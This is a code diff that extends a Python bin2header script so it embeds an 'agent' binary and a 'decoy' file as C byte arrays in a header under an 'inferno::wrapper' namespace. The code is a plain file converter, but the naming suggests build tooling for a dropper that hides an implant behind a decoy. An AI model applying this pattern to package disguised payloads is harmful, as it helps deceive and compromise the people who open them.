@@ -1,29 +1,48 @@
 #!/usr/bin/env python3
-"""Convert a binary file to a C header with AGENT_BINARY and AGENT_BINARY_SIZE."""
+"""Convert two binary files to a C header with AGENT_BINARY and DECOY_DATA arrays.
+
+Usage: bin2header.py <agent_binary> <decoy_file> <output_header>
+"""
 
 import sys
 
+def _write_array(f, name, data):
+    f.write(f'const unsigned char {name}[] = {{\n')
+    for i, b in enumerate(data):
+        f.write(f'0x{b:02x},')
+        if (i + 1) % 16 == 0:
+            f.write('\n')
+    f.write('\n};\n')
+    f.write(f'const size_t {name}_SIZE = {len(data)};\n')
+
 def main():
-    if len(sys.argv) != 3:
-        print(f"Usage: {sys.argv[0]} <input_binary> <output_header>", file=sys.stderr)
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <agent_binary> <decoy_file> <output_header>", file=sys.stderr)
         sys.exit(1)
 
-    in_path, out_path = sys.argv[1], sys.argv[2]
+    agent_path, decoy_path, out_path = sys.argv[1], sys.argv[2], sys.argv[3]
 
-    with open(in_path, 'rb') as f:
-        data = f.read()
+    try:
+        with open(agent_path, 'rb') as f:
+            agent_data = f.read()
+    except (IOError, OSError) as e:
+        print(f"Error reading agent binary '{agent_path}': {e}", file=sys.stderr)
+        sys.exit(1)
+
+    try:
+        with open(decoy_path, 'rb') as f:
+            decoy_data = f.read()
+    except (IOError, OSError) as e:
+        print(f"Error reading decoy file '{decoy_path}': {e}", file=sys.stderr)
+        sys.exit(1)
 
     with open(out_path, 'w') as f:
         f.write('#pragma once\n')
         f.write('#include <cstddef>\n')
         f.write('namespace inferno { namespace wrapper {\n')
-        f.write('const unsigned char AGENT_BINARY[] = {\n')
-        for i, b in enumerate(data):
-            f.write(f'0x{b:02x},')
-            if (i + 1) % 16 == 0:
-                f.write('\n')
-        f.write('\n};\n')
-        f.write(f'const size_t AGENT_BINARY_SIZE = {len(data)};\n')
+        _write_array(f, 'AGENT_BINARY', agent_data)
+        f.write('\n')
+        _write_array(f, 'DECOY_DATA', decoy_data)
         f.write('} }\n')
 
 if __name__ == '__main__':
